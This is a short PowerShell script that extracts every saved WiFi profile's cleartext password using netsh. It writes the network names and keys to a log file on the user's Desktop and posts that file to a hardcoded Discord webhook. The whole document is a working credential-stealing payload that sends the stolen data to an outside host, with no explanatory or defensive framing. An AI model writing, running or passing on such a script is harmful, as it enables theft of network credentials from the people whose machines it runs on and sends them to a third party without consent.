# Get WiFi passwords and save to log.txt
netsh wlan show profiles | Select-String "\:(.+)$" | %{
    $name = $_.Matches.Groups[1].Value.Trim()
    netsh wlan show profile name="$name" key=clear
} | Select-String "Key Content\W+\:(.+)$" | %{
    $pass = $_.Matches.Groups[1].Value.Trim()
    [PSCustomObject]@{ SSID=$name;PASSWORD=$pass }
} | Format-Table -AutoSize > $env:USERPROFILE\Desktop\log.txt

# Send to Discord webhook
$webhookUrl = "https://discord.com/api/webhooks/1564259572938571907/b_Bkl5uc8KHs6Yt40X7eghMUZqAyK7_g2YB0ITn_ikknIvXKvwAa6g_Jq6AesvE4NCH-"
$discordMessage = Get-Content $env:USERPROFILE\Desktop\log.txt | Out-String
Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $discordMessage